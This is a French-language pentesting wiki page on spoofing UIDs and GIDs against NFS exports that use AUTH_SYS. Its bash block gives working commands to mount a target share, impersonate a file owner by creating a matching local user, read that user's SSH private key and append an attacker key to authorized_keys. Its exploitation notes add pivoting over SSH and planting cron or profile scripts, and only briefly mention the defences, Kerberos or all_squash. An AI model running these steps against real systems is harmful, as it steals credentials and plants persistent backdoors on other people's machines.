---
title: "Usurpation d'UID et de GID : se faire passer pour n'importe quel utilisateur sous AUTH_SYS"
order: 3
description: "Avec AUTH_SYS, NFS autorise l'accès d'après l'UID et le GID numériques envoyés par le client, pas d'après une identité authentifiée. Un attaquant qui peut régler son UID/GID local pour correspondre au propriétaire d'un fichier, en créant un utilisateur local correspondant ou en montant en tant que root et en changeant d'identité, lit et écrit les fichiers de cet utilisateur sur l'export, se faisant passer pour n'importe quel compte non-root."
keywords:
  - auth_sys
  - usurpation d'uid
  - usurpation de gid
  - nfs
  - usurpation d'identité
---

# Usurpation d'UID et de GID

Sous `AUTH_SYS`, NFS prend ses décisions d'autorisation à partir de l'UID et du GID portés dans chaque requête RPC, et il leur fait confiance : il n'y a aucune preuve que le client est bien cet utilisateur. Donc pour accéder à un fichier possédé par l'UID 1005 sur l'export, un attaquant a simplement besoin que ses requêtes portent l'UID 1005. Sur une machine qu'il contrôle, c'est trivial : créez un utilisateur local avec cet UID, ou montez en tant que root et faites un `setuid` vers lui, et chaque accès à l'export est alors autorisé en tant que cet utilisateur. Cela usurpe n'importe quel compte non-root indépendamment de `root_squash`, parce que le squashing ne remappe que l'UID 0, pas les autres UID.

## La technique

```bash
# learn the owning UID/GID of the target files
mount -t nfs -o vers=3 <target>:/srv/share /mnt/nfs
ls -lan /mnt/nfs                              # e.g. files owned by 1005:1005
# option A: create a local user with the matching UID, then act as them
useradd -u 1005 victim 2>/dev/null; usermod -aG 1005 victim 2>/dev/null
sudo -u victim cat /mnt/nfs/victim/.ssh/id_rsa
# option B: as root locally (no_root_squash not needed for non-root targets),
#   switch identity so requests carry the target UID/GID
su - victim -c 'ls -la /mnt/nfs/victim'
# write as the target user too (plant keys, cron, etc. in their space)
sudo -u victim sh -c 'mkdir -p /mnt/nfs/victim/.ssh; echo "<key>" >> /mnt/nfs/victim/.ssh/authorized_keys'
```

## Notes d'exploitation

- Cela fonctionne dès que `AUTH_SYS` est utilisé et que l'identité cible n'est pas root ; `root_squash` ne l'empêche pas parce que vous usurpez des UID ordinaires, pas l'UID 0.
- Lire le `.ssh/id_rsa` d'un utilisateur ou écrire son `authorized_keys` sur l'export permet de pivoter en SSH en tant que cet utilisateur sur tout système partageant le répertoire personnel ; écrire un script cron ou de profil s'exécute en tant que lui.
- L'usurpation de GID suit la même logique pour les fichiers lisibles/inscriptibles par groupe ; ajoutez le GID correspondant à votre utilisateur usurpé.
- La défense est `sec=krb5` (identités authentifiées) ou `all_squash` (tout mappé vers un unique utilisateur non privilégié) ; là où ceux-ci sont activés, cela est émoussé, voir [NFSv4 et Kerberos](nfsv4-and-kerberos.md).

## Références

- [NFS AUTH_SYS security](https://man7.org/linux/man-pages/man5/nfs.5.html)
- [HackTricks: NFS UID spoofing](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
